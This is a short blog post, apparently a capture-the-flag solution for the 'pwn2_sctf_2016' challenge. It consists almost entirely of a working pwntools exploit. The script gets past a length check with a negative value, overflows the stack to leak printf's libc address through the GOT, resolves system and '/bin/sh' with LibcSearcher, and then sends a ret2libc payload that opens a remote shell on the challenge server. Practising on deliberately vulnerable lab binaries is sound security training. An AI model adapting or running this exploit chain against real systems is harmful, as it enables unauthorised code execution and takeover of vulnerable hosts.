+++
title = "exp"
date = "2026-01-14"
type = "post"
categories = ['BUU']
tags = ['第一页', 'pwn2_sctf_2016（libc泄露+栈溢出）']
draft = false
+++
```python
from pwn import *
from LibcSearcher import LibcSearcher
context(arch='i386', os='linux', log_level='debug')
 
#io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect('node5.buuoj.cn',26718)              # 与在线环境交互。
 
offset = 0x2c + 0x4
vuln_addr = 0x804852F
 
elf = ELF("./pwn")
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
 
io.recvuntil(b'How many bytes do you want me to read? ')
io.sendline(b'-1')
 
io.recvuntil(b'bytes of data!\n')
payload = b'a'*offset + p32(printf_plt) + p32(vuln_addr) + p32(printf_got)
io.sendline(payload)
 
io.recvuntil(b'\n')
printf_addr = u32(io.recv(4).ljust(4,b'\x00'))
print(hex(printf_addr))
 
libc = LibcSearcher('printf',printf_addr)
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
 
io.recvuntil(b'How many bytes do you want me to read? ')
io.sendline(b'-1')
 
io.recvuntil(b'bytes of data!\n')
payload = b'a'*offset + p32(system_addr) + p32(vuln_addr) + p32(bin_sh_addr)
io.sendline(payload)
 
io.interactive()
```
